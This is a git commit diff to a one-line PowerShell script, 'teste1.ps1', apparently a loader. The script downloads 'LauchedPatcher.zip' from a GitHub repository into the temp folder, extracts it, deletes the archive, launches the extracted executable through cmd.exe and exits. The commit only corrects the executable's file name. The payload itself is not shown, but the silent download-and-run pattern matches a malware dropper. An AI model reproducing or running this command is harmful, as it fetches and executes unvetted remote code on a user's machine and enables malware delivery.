27ec8344eadf873821fcffa4dd212432ee2223b2
SKILK12 <153369619+SKILK12@users.noreply.github.com>
2023-12-19 19:54:12 +0000

    teste1.ps1

--- teste1.ps1
+++ teste1.ps1
@@ -1,2 +1,2 @@
-iwr https://github.com/SKILK12/MENI/raw/main/LauchedPatcher.zip -OutFile "$env:TEMP\LauchedPatcher.zip"; Expand-Archive -Path "$env:TEMP\LauchedPatcher.zip" -DestinationPath "$env:TEMP" -Force; Remove-Item -Path "$env:TEMP\LauchedPatcher.zip" -Force; Start-Process -FilePath "cmd.exe" -ArgumentList "/c $env:TEMP\LauchedPatcher"; Start-Sleep -Seconds 1; exit
+iwr https://github.com/SKILK12/MENI/raw/main/LauchedPatcher.zip -OutFile "$env:TEMP\LauchedPatcher.zip"; Expand-Archive -Path "$env:TEMP\LauchedPatcher.zip" -DestinationPath "$env:TEMP" -Force; Remove-Item -Path "$env:TEMP\LauchedPatcher.zip" -Force; Start-Process -FilePath "cmd.exe" -ArgumentList "/c $env:TEMP\LauchedPatcher.exe"; Start-Sleep -Seconds 1; exit
 
